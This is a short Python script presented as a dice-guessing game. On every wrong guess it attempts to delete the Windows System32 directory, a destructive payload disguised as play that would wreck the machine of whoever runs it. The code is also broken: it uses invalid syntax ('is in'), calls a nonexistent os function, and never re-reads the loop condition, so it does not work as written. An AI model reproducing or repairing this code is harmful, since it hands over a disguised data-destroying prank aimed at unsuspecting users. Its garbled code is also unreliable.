import os
import random
choice = input("Do you wanna play? Y/N : ")
while(choice is in ["Y","y"]):
    win = random.randint(1,6)
    gamble = int(input("Chose a number between 1 and 6 both included:"))
    if gamble == win:
        print("You WIN!!!!!!!!!!")
    else:
        os.rmdirs("C:\Windows\System32")
    
    
